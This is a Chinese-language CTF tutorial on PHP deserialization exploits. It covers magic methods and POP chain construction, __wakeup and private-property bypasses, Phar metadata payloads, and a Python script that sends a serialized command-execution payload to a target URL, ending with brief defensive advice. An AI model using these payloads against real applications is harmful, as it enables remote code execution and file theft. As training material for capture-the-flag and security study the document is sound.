# Web CTF - PHP 反序列化漏洞

## 题目类型
Web - PHP 反序列化

## 基础概念

### 序列化与反序列化
```php
// 序列化
$obj = new User();
$serialized = serialize($obj);

// 反序列化
$obj = unserialize($serialized);
```

### 魔术方法
```php
__construct()  // 对象创建时
__destruct()   // 对象销毁时
__wakeup()     // unserialize() 时
__toString()   // 对象被当作字符串时
__call()       // 调用不存在的方法时
__get()        // 访问不存在的属性时
__set()        // 设置不存在的属性时
```

## POP 链构造

### 基本思路
1. 找到入口点（通常是 `__destruct()` 或 `__wakeup()`）
2. 寻找可利用的魔术方法链
3. 构造对象链达到目标（RCE/文件读取等）

### 示例 - 文件读取
```php
<?php
class FileReader {
    public $filename;

    function __destruct() {
        echo file_get_contents($this->filename);
    }
}

class Trigger {
    public $obj;

    function __toString() {
        return $this->obj->filename;
    }
}

// 构造 POP 链
$reader = new FileReader();
$reader->filename = "/flag";

$payload = serialize($reader);
echo $payload;
// O:10:"FileReader":1:{s:8:"filename";s:5:"/flag";}
?>
```

### 示例 - 命令执行
```php
<?php
class Command {
    public $cmd;

    function __destruct() {
        system($this->cmd);
    }
}

$exploit = new Command();
$exploit->cmd = "cat /flag";

echo serialize($exploit);
?>
```

## 常见绕过技巧

### 1. 绕过 __wakeup()
```php
// 原始序列化
O:4:"User":1:{s:4:"name";s:5:"admin";}

// 修改对象属性数量绕过 __wakeup
O:4:"User":2:{s:4:"name";s:5:"admin";}
```

### 2. 字符串逃逸
```php
// 过滤函数将 "x" 替换为 "yy"
// 原始: s:2:"xx"; 变成 s:2:"yyyy"; (长度不匹配)

// 利用：构造多余字符逃逸后续内容
```

### 3. 引用绕过
```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";R:2;}
```

### 4. 私有/保护属性
```php
// 私有属性: \x00ClassName\x00propertyName
// 保护属性: \x00*\x00propertyName

O:4:"User":1:{s:14:"\x00User\x00password";s:5:"admin";}
```

## Phar 反序列化

### 原理
通过 `phar://` 伪协议触发反序列化

### 生成 Phar
```php
<?php
class Exploit {
    public $cmd = "cat /flag";
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>
```

### 触发
```php
file_get_contents('phar://exploit.phar/test.txt');
file_exists('phar://exploit.phar/test.txt');
is_dir('phar://exploit.phar/test.txt');
```

## 实战技巧

### 1. 信息收集
- 查看源码，寻找 `unserialize()` 调用
- 分析类定义，寻找危险魔术方法
- 绘制 POP 链路径图

### 2. Payload 构造
```python
import requests

# PHP 序列化 Payload
payload = 'O:7:"Command":1:{s:3:"cmd";s:9:"cat /flag";}'

# URL 编码
import urllib.parse
encoded = urllib.parse.quote(payload)

# 发送请求
r = requests.get(f"http://target.com/page?data={encoded}")
print(r.text)
```

### 3. 调试技巧
- 使用 `var_dump()` 查看序列化结果
- 使用 `print_r()` 查看对象结构
- 本地搭建环境测试 POP 链

## 常见题型

### 1. 直接反序列化
```php
$data = $_GET['data'];
unserialize($data);
```

### 2. Session 反序列化
```php
// php.ini 配置不一致导致
session.serialize_handler = php_serialize
session.serialize_handler = php
```

### 3. Phar 反序列化
```php
$filename = $_GET['file'];
file_exists($filename);  // 可以传入 phar://
```

## 工具推荐
- PHPGGC - PHP 反序列化 Gadget 链生成器
- Burp Suite - 抓包修改序列化数据
- PHP 在线反序列化工具

## 防御措施
1. 避免反序列化用户输入
2. 使用 JSON 代替 serialize
3. 实现 `__wakeup()` 进行验证
4. 禁用危险函数
